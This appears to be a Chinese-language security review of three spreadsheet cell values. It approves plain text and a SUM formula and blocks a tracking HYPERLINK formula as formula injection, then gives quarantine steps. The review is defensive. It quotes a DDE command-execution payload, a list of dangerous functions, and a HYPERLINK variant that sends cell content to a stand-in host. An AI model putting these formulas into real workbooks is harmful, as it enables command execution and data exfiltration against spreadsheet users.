## 一、逐条审查

### 第 1 条：`Q4 销售目标：1200 万` → **放行**

理由：

- 首字符是中文"Q"，**不含**公式/注入前导字符（`=`、`+`、`-`、`@`），不存在 CSV/公式注入面；Excel 会按字符串原样展示，无任何求值、导航或网络副作用。
- 无链接、无外部引用、无宏，属于正常业务文案，写入投放表完全合规。

唯一要求：以**字符串类型**写入，禁止写入端做"看起来像公式就当公式"的自动嗅探（本条不受影响，但这是同类内容的一致性防线）。

### 第 2 条：`=SUM(B2:B13)` → **放行（受控公式）**

理由：

- `SUM` 是无副作用的本地聚合函数；引用范围 `B2:B13` 限于本表本地单元格，**没有**外部工作簿引用（`[book.xlsx]Sheet!A1` 形式）、无 UNC 路径、无 URL 引用。
- 不属于危险函数族：不含 `WEBSERVICE` / `FILTERXML` / `CALL` / `REGISTER.ID` / DDE 类（如 `=CMD|' /C calc'!A0`）/ `EXEC` / `SET.VALUE` 等；不产生网络请求，不执行命令。
- 结果确定、可审计，是投放/经营类工作表的常规业务公式，拦截它没有安全收益，只有业务损失。

残余风险（正确性问题，非安全问题）：

- openpyxl 类后端写公式不做重算，公式落盘后可能没有缓存值，需用户在 Excel 中打开刷新；若 `B2:B13` 为空，结果为 0，可能造成"看起来有数其实是 0"的误读。建议写入端做一次重算或提示刷新。

边界条件：若该内容来自**不可信外部输入**且写入服务端没有公式白名单机制，则应与第 3 条同规则降级为文本写入（`'=SUM(B2:B13)` 或去掉 `=` 前缀）。本审查按"写入端存在公式白名单、SUM 在白名单内"的场景放行。

### 第 3 条：`=HYPERLINK("http://track.example.com/pixel","限时优惠点击查看")` → **拦截**

`HYPERLINK` 是 CSV/公式注入已知载荷类别中的典型形态（OWASP CSV Injection 文档即列出 HYPERLINK 作为利用手法）。逐点理由：

1. **公式注入载体**：这是以待写内容形态出现、以 `=` 开头的公式——正是"文本进、公式出"的注入面。对来源不完全可控的写入请求，公式必须过白名单，而 `HYPERLINK` 不应在白名单内。
2. **显示文本与真实目标背离**：单元格中用户只会看到"限时优惠点击查看"，真实目的地 `http://track.example.com/pixel` 被完全隐藏。诱导性营销文案 + 隐藏跳转，正是钓鱼链接的标准构造；且这条内容混在销售目标表里，进一步利用了表格语境的可信度。
3. **追踪像素（tracking pixel）**：域名 `track.`、路径 `/pixel` 表明这是跟踪像素。用户点击单元格即向第三方服务器上报 IP、User-Agent、时间戳以及"该文档被打开/在传播链中"的事实，工作簿变成跟踪信标。如实说明边界：桌面 Excel 打开文件本身不会自动请求 HYPERLINK 目标（点击才导航），但邮件/网盘预览、链接预览服务、安全扫描器都可能触发请求，且该信标随文件分发链持续扩散。
4. **数据外泄通道模式**：HYPERLINK 的目标参数可拼接单元格内容（如 `"http://track.example.com/p?d="&A1`），这是公式类数据外泄的标准载体。本例虽是静态 URL，但放行这一类别等于为后续拼接式变体开了通道。
5. **主机校验不通过**：按链接/URL 写入安全约束（仅允许 http/https；发请求前校验 host，拒绝 localhost、环回、私有和保留地址——本会话 Mimosa 生成前安全约束同款规则）：scheme `http` 合规，但 host `track.example.com` 属于 RFC 2606 保留的文档演示域（`example.com`/`example.net`/`example.org` 系），不在任何业务域名白名单内。即使只对 URL 本身做校验、不谈公式问题，此项也不通过。

**若放行会带来的风险**：

- 收件人被"限时优惠"文案诱导点击，向第三方泄露访问信息与阅读行为；
- 含此信标的文件在外发、转发、归档链中持续上报，泄露组织内部文档流转情况；
- 形成"营销/追踪链接可以直接写进业务表格"的既成事实，后续同名载荷换成拼接单元格内容的变体即可实施数据外泄；
- 直接后果：钓鱼/营销诱导内容混入销售目标表，误导该表所有使用者。

## 二、被拦截项（第 3 条）的安全处置方案

处置原则：**不执行公式求值，但保留证据、不丢信息、留痕可审计**。

1. **无害文本写入（采用）**：将原始公式字符串加前导单引号 `'`（Excel 语义下的强制文本约定），并以显式 `type: "string"` 写入 A3，双保险保证任何后端（openpyxl 类按 `=` 前缀嗅探的、或按类型参数写入的）都不会将其求值为公式。落盘后单元格显示原公式全文但**绝不求值**——不导航、不请求；前导 `'` 在部分后端会原样显示，这反而是可取的：该单元格在视觉上被标记为"隔离内容"。
   - 若所用工具无类型参数且按 `=` 前缀自动转公式，则退一步：去掉 `=` 前缀以纯文本写入 `HYPERLINK("http://track.example.com/pixel","限时优惠点击查看")`。
2. **替代方案（更保守，可选）**：A3 写中性占位文本 `【已拦截：外部链接公式，待安全审核】`，原始载荷只进审计日志、不进表格。适用于表格会直接分发给最终用户的场景。
3. **审计记录**：生成拒绝/处置记录（见第三节配套 JSON），记明日期、位置、原始载荷、处置方式与拒绝理由，供事后复核与策略回溯。
